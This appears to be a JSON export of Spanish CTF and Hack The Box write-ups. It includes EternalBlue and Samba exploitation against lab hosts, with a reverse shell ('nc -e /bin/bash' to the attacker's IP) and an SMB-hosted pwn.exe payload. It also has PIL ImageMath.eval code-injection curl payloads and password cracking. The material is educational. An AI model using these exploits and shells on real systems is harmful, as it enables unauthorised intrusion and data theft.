#smbConn.disconnectTree(tid2) #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py') service_exec(conn, r'cmd /c \\\\10.10.17.44\\smbFolder\\pwn.exe') # Note: there are many methods to get shell over SMB admin session # a simple method to get shell (but easily to be detected by AV) is # executing binary generated by \"msfvenom -f exe-service ...\"  Entonces, iniciamos el servidor SMB con smbserver.py (Impacket) y ejecutamos el exploit. Si no funciona, podemos usar una de las pipes listadas con checker.py (samr, lsarpc, browser\u0026hellip;):\n$ impacket-smbserver smbFolder \"$(pwd)\" Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed  root@2955c01b9358:/opt/MS17-010# python zzz_exploit.py 10.10.10.40 samr Target OS: Windows 7 Professional 7601 Service Pack 1 Target is 64 bit Got frag size: 0x10 GROOM_POOL_SIZE: 0x5030 BRIDE_TRANS_SIZE: 0xfa0 CONNECTION: 0xfffffa80038c3020 SESSION: 0xfffff8a0085478a0 FLINK: 0xfffff8a0080cc048 InParam: 0xfffff8a00872a15c MID: 0x3803 unexpected alignment, diff: 0x-65efb8 leak failed... try again CONNECTION: 0xfffffa80038c3020 SESSION: 0xfffff8a0085478a0 FLINK: 0xfffff8a0087b2088 InParam: 0xfffff8a0087a515c MID: 0x3903 unexpected alignment, diff: 0xc088 leak failed... try again CONNECTION: 0xfffffa80038c3020 SESSION: 0xfffff8a0085478a0 FLINK: 0xfffff8a0087d2088 InParam: 0xfffff8a0087cc15c MID: 0x3903 success controlling groom transaction modify trans1 struct for arbitrary read/write make this SMB session to be SYSTEM overwriting session security context Opening SVCManager on 10.10.10.40..... Creating service zVPI..... Starting service zVPI..... The NETBIOS connection with the remote host timed out. Removing service zVPI..... ServiceExec Error on: 10.10.10.40 Unexpected answer from server: Got 46, Expected 47 Done  Recibimos una conexión en el servidor SMB:\n$ impacket-smbserver smbFolder \"$(pwd)\" Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.10.40,49197) [*] AUTHENTICATE_MESSAGE (\\,HARIS-PC) [*] User HARIS-PC\\ authenticated successfully [*] :::00::aaaaaaaaaaaaaaaa [-] Unknown level for query path info! 0x109 [-] Unknown level for query path info! 0x4 [-] Unknown level for query path info! 0x109  Y el binario pwn.exe se ejecuta y obtenemos una shell como nt authority\\system:\n$ rlwrap ncat -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.40. Ncat: Connection from 10.10.10.40:49198. Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system  En este punto, podemos leer ambas flags user.txt y root.txt:\nC:\\Windows\\system32\u0026gt;dir C:\\Users Volume in drive C has no label. Volume Serial Number is BE92-053B Directory of C:\\Users 21/07/2017 07:56 \u0026lt;DIR\u0026gt; . 21/07/2017 07:56 \u0026lt;DIR\u0026gt; .. 21/07/2017 07:56 \u0026lt;DIR\u0026gt; Administrator 14/07/2017 14:45 \u0026lt;DIR\u0026gt; haris 12/04/2011 08:51 \u0026lt;DIR\u0026gt; Public 0 File(s) 0 bytes 5 Dir(s) 2,691,747,840 bytes free C:\\Windows\\system32\u0026gt;type C:\\Users\\haris\\Desktop\\user.txt bb50fc9a421df6dc53a95fd7a5c4bfe6 C:\\Windows\\system32\u0026gt;type C:\\Users\\Administrator\\Desktop\\root.txt fd999003d610c8fe77d56868651ba5d3  ","image":"/images/HTB/Blue/Blue.png","permalink":"https://7rocky.github.io/htb/blue/","section":"htb","summary":"Hack The Box. Windows. Máquina fácil. Esta máquina expone SMB versión 1, siendo vulnerable a EternalBlue. Una vez que el exploit está completado, tenemos acceso como Administrator","time":5,"title":"Blue"},{"contents":"  SO: Linux   Dificultad: Fácil   Dirección IP: 10.10.10.3   Fecha: 14 / 03 / 2017   Escaneo de puertos # Nmap 7.92 scan initiate as: nmap -sC -sV -Pn -o nmap/targeted 10.10.10.3 -p 21,22,139,445,3632 Nmap scan report for 10.10.10.3 Host is up (0.064s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.17.44 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_smb2-time: Protocol negotiation failed (SMB2) | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | Computer name: lame | NetBIOS computer name: | Domain name: hackthebox.gr | FQDN: lame.hackthebox.gr |_ System time: |_clock-skew: mean: 2h01m21s, deviation: 2h49m45s, median: 1m18s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 52.51 seconds  La máquina tiene abiertos los puertos 21 (FTP), 22 (SSH), 139, 445 (SMB) y 3632.\nEnumeración por FTP Como dice nmap podemos acceder por FTP con credenciales anonymous:\n$ ftp 10.10.10.3 Connected to 10.10.10.3. 220 (vsFTPd 2.3.4) Name (10.10.10.3:rocky): anonymous 331 Please specify the password. Password: 230 Login successful. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. 226 Directory send OK.  Pero no hay nada dentro.\nPodemos buscar exploits para la versión del servicio FTP (vsFTP 2.3.4) con searchsploit:\n$ searchsploit vsftp 2.3.4 ------------------------------------------------------- ---------------------- Exploit Title | Path ------------------------------------------------------- ---------------------- vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb ------------------------------------------------------- ---------------------- Shellcodes: No Results  Vale, parece que podemos obtener ejecución remota de comandos (RCE) para esta versión (CVE-2011-2523). Si inspeccionamos el código fuente del exploit, parece que hay una puerta trasera (backdoor) para el usuario nergal:) que abre una shell en el puerto 6200. No obstante, no es explotable.\nEnumeración por SMB Vamos a buscar exploit para Samba 3.0.20 en searchsploit:\n$ searchsploit Samba 3.0.20 --------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------- --------------------------------- Samba 3.0.10 \u0026lt; 3.3.5 - Format String / Security Bypass | multiple/remote/10095.txt Samba 3.0.20 \u0026lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb Samba \u0026lt; 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba \u0026lt; 3.0.20 - Remote Heap Overflow | linux/remote/7701.txt Samba \u0026lt; 3.6.2 (x86) - Denial of Service (PoC) | linux_x86/dos/36741.py ------------------------------------------------------------------------------------------------------------------- Shellcodes: No Results  Genial, hay uno que nos da RCE.\nIntrusión en la máquina Vamos a utilizar Metasploit para esto:\n# msfconsole -q msf6 \u0026gt; search Samba 3.0.20 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/samba/usermap_script 2007-05-14 excellent No Samba \"username map script\" Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script msf6 \u0026gt; use exploit/multi/samba/usermap_script [*] No payload configured, defaulting to cmd/unix/reverse_netcat msf6 exploit(multi/samba/usermap_script) \u0026gt; show options Module options (exploit/multi/samba/usermap_script): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 139 yes The target port (TCP) Payload options (cmd/unix/reverse_netcat): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 192.168.1.100 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic msf6 exploit(multi/samba/usermap_script) \u0026gt; set RHOSTS 10.10.10.3 RHOSTS =\u0026gt; 10.10.10.3 msf6 exploit(multi/samba/usermap_script) \u0026gt; set LHOST 10.10.17.44 LHOST =\u0026gt; 10.10.17.44 msf6 exploit(multi/samba/usermap_script) \u0026gt; exploit [*] Started reverse TCP handler on 10.10.17.44:4444 [*] Command shell session 1 opened (10.10.17.44:4444 -\u0026gt; 10.10.10.3:40626) at 2022-07-17 18:24:10 +0200 which nc /bin/nc nc -e /bin/bash 10.10.17.44 5555  Decidí utilizar una segunda reverse shell para obtener una TTY completa en nc:\n$ nc -nlvp 5555 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::5555 Ncat: Listening on 0.0.0.0:5555 Ncat: Connection from 10.10.10.3. Ncat: Connection from 10.10.10.3:54564. script /dev/null -c bash root@lame:/# ^Z zsh: suspended ncat -nlvp 5555 $ stty raw -echo; fg [1] + continued ncat -nlvp 5555 Erase set to delete. Kill set to control-U (^U). Interrupt set to control-C (^C). root@lame:/# export TERM=xterm root@lame:/# export SHELL=bash root@lame:/# stty rows 50 columns 158  Escalada de privilegios Ya somos root, por lo que solamente tenemos que capturar las flags:\nroot@lame:/# ls /home ftp makis service user root@lame:/# find /home -name user.txt /home/makis/user.txt root@lame:/# cat /home/makis/user.txt 56c5a638db443c0dd212990228c55aec root@lame:/# cat /root/root.txt 490c7ed2a8c6e7a72d719d478938accc  ","image":"/images/HTB/Lame/Lame.png","permalink":"https://7rocky.github.io/htb/lame/","section":"htb","summary":"Hack The Box. Linux. Máquina fácil. Esta máquina expone versiones vulnerables de servicios FTP y SMB. El servicio SMB es explotable y deriva en RCE como root","time":3,"title":"Lame"},{"contents":"Se nos proporciona un archivo PDF llamado 0ld is g0ld.pdf, pero está protegido con contraseña\nPara obtener la contraseña, podemos usar pdf2john para extraer nu hash y pasárselo a john para romperlo con un ataque de diccionario usando rockyou.txt:\n$ pdf2john 0ld\\ is\\ g0ld.pdf | tee hash 0ld is g0ld.pdf:$pdf$4*4*128*-1060*1*16*5c8f37d2a45eb64e9dbbf71ca3e86861*32*9cba5cfb1c536f1384bba7458aae3f8100000000000000000000000000000000*32*702cc7ced92b595274b7918dcb6dc74bedef6ef851b4b4b5b8c88732ba4dac0c $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64]) Cost 1 (revision) is 4 for all loaded hashes Press 'q' or Ctrl-C to abort, almost any other key for status jumanji69 (0ld is g0ld.pdf) 1g 0:00:01:28 DONE 0.01126g/s 76825p/s 76825c/s 76825C/s jumapi..jumanee Use the \"--show --format=PDF\" options to display all of the cracked passwords reliably Session completed.  Y tenemos la contraseña (jumanji69). Si abrimos el archivo PDF, veremos un retrato de Samuel Morse:\nY si hacemos un poco de zoom veremos una ristra de . y - (que es código Morse):\nEntonces, cogemos esta cadena y la decodificamos:\nY la flag es: HTB{R1PSAMU3LM0RS3}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/0ld-is-g0ld/","section":"ctf","summary":"Hash de archivo PDF. Código Morse","time":0,"title":"0ld is g0ld"},{"contents":"Se nos proporciona este conjunto de números y caracteres:\n1-3,4-4,2-1,3-1,1-5,1-1,4-2,3-3,{,4-4,2-3,4-5,3-2,1-2,4-3,_,4-5,3-5,}  Y se nos dice que el método de cifrado usa una tabla 5x5 con todas las letras del alfabeto en orden. Si hacemos una búsqueda rápida, llegamos al Cuadrado de Polibio, que es este:\n            A B C D E   F G H I/J K   L M N O P   Q R S T U   V W X Y Z    Podemos tomar cada par i-j y tomar la letra correspondiente al hacer coincidir fila y columna. Por ejemplo, 1-1 es la A y 5-5 es la Z. Después de descifrar, obtendremos CTFLEARN{THUMBS_UP}, por lo que la flag es: CTFlearn{THUMBS_UP}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/5x5-crypto/","section":"ctf","summary":"Cuadrado de Polibio","time":0,"title":"5x5 Crypto"},{"contents":"Tenemos una simple página web como esta:\nPodemos leer el código HTML de la página, que es el siguiente:\nHay una imagen llamada background.png, Pero no observamos nada en la página web. Podemos acceder a ella utilizando curl:\n$ curl http://35.190.155.168/9a968e7787/background.png ^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$  Y obtenemos la flag.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/hacker101ctf/a-little-something-to-get-you-started/","section":"ctf","summary":"Código fuente de página web","time":0,"title":"A little something to get you started"},{"contents":"Se nos proporciona esta salida:\nPython 3.8.10 (default, Mar 15 2022, 12:22:08) [GCC 9.4.0] on linux Type \"help\", \"copyright\", \"credits\" or \"license\" for more information. \u0026gt;\u0026gt;\u0026gt; import random \u0026gt;\u0026gt;\u0026gt; from Crypto.Cipher import AES \u0026gt;\u0026gt;\u0026gt; key = random.choice(open(\"rockyou.txt\", \"rb\").readlines()[:10000]).strip() \u0026gt;\u0026gt;\u0026gt; key = key.zfill(16) \u0026gt;\u0026gt;\u0026gt; cipher = AES.new(key, AES.MODE_ECB) \u0026gt;\u0026gt;\u0026gt; cipher.encrypt(open(\"flag.txt\", \"rb\").read().zfill(48)) b\"\\xd6\\x19O\\xbeA\\xb0\\x15\\x87\\x0e\\xc7\\xc4\\xc1\\xe9h\\xd8\\xe6\\xc6\\x95\\x82\\xaa#\\x91\\xdb2l\\xfa\\xf7\\xe1C\\xb8\\x11\\x04\\x82p\\xe5\\x9e\\xb1\\x0c*\\xcc[('\\x0f\\xcc\\xa7W\\xff\"  Se trata del resultado de una consola de Python REPL. Lo que hace es coger una contraseña aleatoria de rockyou.txt y la usa como clave para cifrar la flag con AES ECB. También tenemos el texto cifrado.\nSolamente necesitamos coger las contraseñas de rockyou.txt y realizar el descifrado hasta que encontremos una flag que se descifre bien (es decir, que contenga ictf{):\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; ct = b\"\\xd6\\x19O\\xbeA\\xb0\\x15\\x87\\x0e\\xc7\\xc4\\xc1\\xe9h\\xd8\\xe6\\xc6\\x95\\x82\\xaa#\\x91\\xdb2l\\xfa\\xf7\\xe1C\\xb8\\x11\\x04\\x82p\\xe5\\x9e\\xb1\\x0c*\\xcc[('\\x0f\\xcc\\xa7W\\xff\" \u0026gt;\u0026gt;\u0026gt; keys = open(\"rockyou.txt\", \"rb\").readlines()[:10000] \u0026gt;\u0026gt;\u0026gt; from Crypto.Cipher import AES \u0026gt;\u0026gt;\u0026gt; for key in keys: ... try: ... cipher = AES.new(key.strip().zfill(16), AES.MODE_ECB) ... pt = cipher.decrypt(ct) ... if b'ictf{' in pt: ... print(key, pt) ... break ... except: ... pass ... b'biscuit\\n' b'0000000000000000000ictf{d0nt_us3_w3ak_k3ys!!!!}\\n'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/aes/","section":"ctf","summary":"ImaginaryCTF 09/08/2022. 50 puntos. AES. Contraseña débil. Fuerza bruta","time":0,"title":"aes"},{"contents":"Se nos proporciona una página web para analizar. La página principal muestra el código fuente del servidor:\n#!/usr/bin/env python3 fromflaskimportFlask, render_template_string, request, Response app=Flask(__name__) @app.route('/') defindex(): returnResponse(open(__file__).read(), mimetype='text/plain') @app.route('/ssti') defssti(): query=request.args['query'] iflen(query) \u0026gt;2: return\"Too long!\" returnrender_template_string(query) app.run('0.0.0.0', 3002, debug=True)  Se trata de una página web hecha en Flask (Python). Algo interesante es que el modo debug está activado.\nEl reto habla de SSTI (Server-Side Template Injection), pero solamente podemos introducir 2 bytes. Esta longitud hace imposible explotar un SSTI. Lo único que podemos hacer es causar un error con {{:\nComo el modo debug está habilitado, podemos abrir una consola interactiva de Python en esta página, (pinchando en el icono de la consola). Y entonces tenemos ejecución remota de comandos, y podemos leer la flag:\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/almost-ssti/","section":"ctf","summary":"ImaginaryCTF 13/07/2022. 50 puntos. Server-Side Template Injection. Consola de Flask","time":0,"title":"Almost SSTI"},{"contents":"Tenemos la siguiente página web, que simula el juego Among Us:\nExiste un botón para seleccionar un color con un color picker:\nSi analizamos el código fuente, tenemos una aplicación en Flask (en Python). Este es application/blueprints/routes.py:\nfromflaskimportBlueprint, request, render_template, abort fromapplication.utilimportmake_alpha web=Blueprint('web', __name__) api=Blueprint('api', __name__) @web.route('/') defindex(): returnrender_template('index.html') @api.route('/alphafy', methods=['POST']) defalphafy(): ifnotrequest.is_jsonor'image'notinrequest.json: returnabort(400) returnmake_alpha(request.json)  La función make_alpha está definida en application/util.py:\nimportos, base64 fromPILimportImage, ImageMath fromioimportBytesIO generate=lambdax: os.urandom(x).hex() defmake_alpha(data): color=data.get('background', [255,255,255]) try: dec_img=base64.b64decode(data.get('image').encode()) image=Image.open(BytesIO(dec_img)).convert('RGBA') img_bands=[band.convert('F') forbandinimage.split()] alpha=ImageMath.eval( f'''float( max( max( max( difference1(red_band, {color[0]}), difference1(green_band, {color[1]}) ), difference1(blue_band, {color[2]}) ), max( max( difference2(red_band, {color[0]}), difference2(green_band, {color[1]}) ), difference2(blue_band, {color[2]}) ) ) )''', difference1=lambdasource, color: (source-color) /(255.0-color), difference2=lambdasource, color: (color-source) /color, red_band=img_bands[0], green_band=img_bands[1], blue_band=img_bands[2] ) new_bands=[ ImageMath.eval( 'convert((image - color) / alpha + color, \"L\")', image=img_bands[i], color=color[i], alpha=alpha ) foriinrange(3) ] new_bands.append(ImageMath.eval( 'convert(alpha_band * alpha, \"L\")', alpha=alpha, alpha_band=img_bands[3] )) new_image=Image.merge('RGBA', new_bands) background=Image.new('RGB', new_image.size, (0, 0, 0, 0)) background.paste(new_image.convert('RGB'), mask=new_image) buffer=BytesIO() new_image.save(buffer, format='PNG') return{ 'image': f'data:image/png;base64,{base64.b64encode(buffer.getvalue()).decode()}' }, 200 exceptException: return'', 400  El problema aquí está en el uso de ImageMath.eval. De hecho, existe CVE-2022-22817. Podemos usar exec para ejecutar código arbitrario en Python.\nLa inyección se procude en el parámetro background, que debería ser un valor RGB, pero no está validado. Por tanto, podemos tratar de importar el módulo os y ejecutar un comando sleep (necesitamos tener cuidado con las comillas y las barras oblicuas):\n$ time curl 178.62.114.46:32326/api/alphafy -d '{\"background\":[\"exec(\\\"import os; os.system(\\\\\\\"sleep 5\\\\\\\")\\\")\",255,255],\"image\":\"'$(base64 challenge/application/static/images/arrow.png)'\"}' -H 'Content-Type: application/json' curl: (52) Empty reply from server 5,23 real 0,00 user 0,00 sys  Como la respuesta tarda más de 5 segundos, tenemos ejecución remota de comandos (RCE). Ahora, podemos mover el archivo flag.txt al directorio static y leer la flag:\n$ curl 178.62.114.46:32326/api/alphafy -d '{\"background\":[\"exec(\\\"import os; os.system(\\\\\\\"cat /flag.txt \u0026gt; /app/application/static/flag.txt\\\\\\\")\\\")\",255,255],\"image\":\"'$(base64 challenge/application/static/images/arrow.png)'\"}' -H 'Content-Type: application/json' curl: (52) Empty reply from server $ curl 178.62.114.46:32326/static/flag.txt HTB{sl33p1ng_my_way_into_RCE}  ","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/amidst-us/","section":"ctf","summary":"Python. Dependencias de terceros. Inyección de código. RCE","time":1,"title":"Amidst Us"},{"contents":"Se nos proporciona el código fuente en Python para lanzar una instancia en local del reto:\n$ python3 source.py  $ nc 127.0.0.1 1337 DEBUG MSG - Generating The Global DH Parameters DEBUG MSG - g = 2, p = 10177459997049772558637057109490700048394574760284564283959324525695097805837401714582821820424475480057537817583807249627119267268524840254542683041588432363128111683358536204391767254517057859973149680238170237977230020947732558089671785239121778309357814575486749623687357688511361367822815452806637006568922401890961240475060822815400430220536180181951862931844638638933951683988349468373510128406899660648258602475728913837826845743111489145006566908004165703542907243208106044538037004824530893555918497937074663828069774495573109072469750423175863678445547058247156187317168731446722852098571735569138516533993 DEBUG MSG - Calculation Complete DEBUG MSG - Generating The Public Key of CPU... DEBUG MSG - Calculation Complete DEBUG MSG - Public Key is: ??? Enter The Public Key of The Memory:  Mirando el código fuente, vemos que el programa espera un número $M$ para generar un secreto compartido.\nSe está empleando un tipo de algoritmo de intercambio de clave de Diffie-Hellman, pero no correctamente. De hecho, el programa pregunta por un número $M$, de manera que el secreto compartido será $M^c \\pmod{p}$, donde $c$ es un número aleatorio desconocido y $p$ es un módulo fijo que podemos saber a partir del código fuente o del mensaje de depuración anterior:\nshared_secret = pow(M, c, p)  Entonces, este código secreto se utiliza para descifrar un mensaje nuestro. Si somos capaces de proporcionar un mensaje cifrado que se descifre como \u0026quot;Initialization Sequence - Code 0\u0026quot;, obtendremos la flag:\nencrypted_sequence = recieveMessage( s, \"Enter The Encrypted Initialization Sequence: \") try: encrypted_sequence = bytes.fromhex(encrypted_sequence) assert len(encrypted_sequence) % 16 == 0 except: sendMessage(s, DEBUG_MSG + \"Unexpected Error Occured\\n\") exit() sequence = decrypt(encrypted_sequence, shared_secret) if sequence == b\"Initialization Sequence - Code 0\": sendMessage(s, \"\\n\" + DEBUG_MSG + \"Reseting The Protocol With The New Shared Key\\n\") sendMessage(s, DEBUG_MSG + f\"{FLAG}\") else: exit()  Recordemos que el secreto compartido se calcula como $M^c \\pmod p$, y que controlamos $M$, por lo que al poner $M = 1$, el secreto compartido será simplemente $1$. Entonces podemos usar el mismo método de cifrado para cifrar \u0026quot;Initialization Sequence - Code 0\u0026quot; y enviarlo.\n$ python3 solve.py 165.227.224.55:31355 [+] Opening connection to 165.227.224.55 on port 31355: Done DEBUG MSG - HTB{7h15_15_cr3@t3d_by_Danb3er_@nd_h@s_c0pyr1gh7_1aws!_!} [*] Closed connection to 165.227.224.55 port 31355  El script completo se puede encontrar aquí: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/crypto/android-in-the-middle/","section":"ctf","summary":"Diffie-Hellman. MITM","time":1,"title":"Android-in-the-middle"},{"contents":"Se nos proporciona un archivo APK (APKrypt.apk). Tenemos que encontrar un código VIP en el archivo APK. Por tanto, utilizaremos d2j-dex2jar para conseguir un archivo JAR:\n$ d2j-dex2jar APKrypt.apk dex2jar APKrypt.apk - ./APKrypt-dex2jar.jar  Ahora podemos subir el archivo JAR a www.javadecompilers.com y seleccionar Jadx como descompilador.\nEl archivo principal es sources/com/example/apkrypt/MainActivity.java:\npackagecom.example.apkrypt; importandroid.app.Activity; importandroid.os.Bundle; importandroid.util.Base64; importandroid.view.View; importandroid.widget.Button; importandroid.widget.EditText; importandroid.widget.Toast; importjava.security.Key; importjava.security.MessageDigest; importjava.security.NoSuchAlgorithmException; importjavax.crypto.Cipher; importjavax.crypto.spec.SecretKeySpec; publicclassMainActivityextendsActivity{ /* renamed from: b1 */ Buttonf77b1; EditTexted1; publicstaticStringdecrypt(Stringstr) throwsException{ KeygenerateKey =generateKey(); Cipherinstance =Cipher.getInstance(\"AES\"); instance.init(2, generateKey); returnnewString(instance.doFinal(Base64.decode(str, 0)), \"utf-8\"); } publicstaticStringencrypt(Stringstr) throwsException{ KeygenerateKey =generateKey(); Cipherinstance =Cipher.getInstance(\"AES\"); instance.init(1, generateKey); returnBase64.encodeToString(instance.doFinal(str.getBytes(\"utf-8\")), 0); } privatestaticKeygenerateKey() throwsException{ returnnewSecretKeySpec(\"Dgu8Trf6Ge4Ki9Lb\".getBytes(), \"AES\"); } publicstaticStringmd5(Stringstr) { try{ MessageDigestinstance =MessageDigest.getInstance(\"MD5\"); instance.update(str.getBytes()); byte[] digest =instance.digest(); StringBufferstringBuffer =newStringBuffer(); for(byteb :digest) { stringBuffer.append(Integer.toHexString(b \u0026amp;255)); } returnstringBuffer.toString(); } catch(NoSuchAlgorithmExceptione) { e.printStackTrace(); return\"\"; } } /* access modifiers changed from: protected */ publicvoidonCreate(Bundlebundle) { super.onCreate(bundle); setContentView(C0535R.layout.activity_main); this.f77b1 =(Button) findViewById(C0535R.C0538id.button); this.ed1 =(EditText) findViewById(C0535R.C0538id.editTextVipCode); this.f77b1.setOnClickListener(newView.OnClickListener() { publicvoidonClick(Viewview) { try{ if(MainActivity.md5(MainActivity.this.ed1.getText().toString()).equals(\"735c3628699822c4c1c09219f317a8e9\")) { Toast.makeText(MainActivity.this.getApplicationContext(), MainActivity.decrypt(\"k+RLD5J86JRYnluaZLF3Zs/yJrVdVfGo1CQy5k0+tCZDJZTozBWPn2lExQYDHH1l\"), 1).show(); } else{ Toast.makeText(MainActivity.this.getApplicationContext(), \"Wrong VIP code!\", 0).show(); } } catch(Exceptione) { e.printStackTrace(); } } }); } }  Lo primero que hace es preguntar por el código VIP en onCreate y mira si su hash MD5 coincide con 735c3628699822c4c1c09219f317a8e9. Si usamos crackstation.net no encontraremos ninguna coincidencia:\nAún así, no nos interesa el código VIP, sino lo que viene después. En caso de que tuviéramos el código VIP, se descifraría un texto cifrado codificado en Base64 (k+RLD5J86JRYnluaZLF3Zs/yJrVdVfGo1CQy5k0+tCZDJZTozBWPn2lExQYDHH1l). El cifrado es AES, y tenemos la clave (Dgu8Trf6Ge4Ki9Lb). Entonces, vamos a descifrarlo usando Python:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from base64 import b64decode \u0026gt;\u0026gt;\u0026gt; from Crypto.Cipher import AES \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.Padding import unpad \u0026gt;\u0026gt;\u0026gt; key = b'Dgu8Trf6Ge4Ki9Lb' \u0026gt;\u0026gt;\u0026gt; ct = b64decode('k+RLD5J86JRYnluaZLF3Zs/yJrVdVfGo1CQy5k0+tCZDJZTozBWPn2lExQYDHH1l') \u0026gt;\u0026gt;\u0026gt; cipher = AES.new(key, AES.MODE_ECB) \u0026gt;\u0026gt;\u0026gt; unpad(cipher.decrypt(ct), AES.block_size) b'HTB{3nj0y_y0ur_v1p_subscr1pt1on}'  ","image":"/images/mobile.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/mobile/apkrypt/","section":"ctf","summary":"Ingeniería inversa de un archivo APK. Cifrado AES","time":1,"title":"APKrypt"},{"contents":"Se nos pide calcular -arcsin(-1) * 0.2 (en radianes) y coger los dígitos entre las posiciones 10000 y 10099 de la parte decimal del resultado.\nAntes que nada, vamos a aplicar matemáticas:\n$$ \\sin{\\left(\\frac{-\\pi}{2}\\right)} = -1 \\iff \\arcsin{(-1)} = \\frac{-\\pi}{2} $$\nNótese que la función arco coseno está acotada: $\\frac{-\\pi}{2} \\leq \\arcsin{x} \\leq \\frac{\\pi}{2}$ for $x \\in \\mathbb{R}$. Por tanto:\n$$ -\\arcsin{(-1)} \\cdot 0.2 = - \\left(\\frac{-\\pi}{2}\\right) \\cdot 0.2 = \\frac{\\pi}{10} $$\nEntonces, nos preguntan por las dígitos de $\\pi$ entre las posiciones 10000 y 10099. También tenemos una comprobación:\n in case I messed up - first digit is 7, last digit is 2, 100 digits total\n Y la flag es:\nictf{7856672279661988578279484885583439751874454551296563443480396642055798293680435220277098429423253302}\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/arcsin1/","section":"ctf","summary":"ImaginaryCTF 14/08/2022. 50 puntos. Arco seno de un número","time":0,"title":"arcsin1"},{"contents":"Se nos proporciona una imagen PNG llamada art.png:\n$ file art.png art.png: PNG image data, 300 x 300, 8-bit/color RGBA, non-interlaced  Podríamos pensar que la flag se esconde en los colores que aparecen en la imagen. No obstante, después de un poco de investigación, encontramos que exista un lenguaje esotérico llamado npiet que codifica texto en imágenes mediante colores:\nLos ejemplos se asemejan bastante a lo que tenemos, por lo que vamos a probar:\nY ahí está la flag: HTB{p137_m0ndr14n}.\n","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/misc/art/","section":"ctf","summary":"Lenguaje esotérico npiet","time":0,"title":"Art"},{"contents":"Se nos proporciona esta página web:\nPrimero, nos podemos registrar (nombre asdf, por ejemplo):\nLuego, nos dicen que no somos admin. De hecho, la autenticación se gestiona con cookies de sesión:\nLa cookie se sesión parece codificada en Base64, por lo que vamos a decodificarla (cuidado con la codificación de URL):\n$ echo eyJ1c2VybmFtZSI6ImFzZGYifQ== | base64 -d {\"username\":\"asdf\"}  Muestra nuestro nombre de usuario, a lo mejor podemos modificar la cookie y ganar acceso como admin:\n$ echo -n '{\"username\":\"admin\"}' | base64 eyJ1c2VybmFtZSI6ImFkbWluIn0=  Si el servidor es vulnerable, al refrescar la página la cookie le dirá al servidor que somos admin. Y ahí tenemos la flag 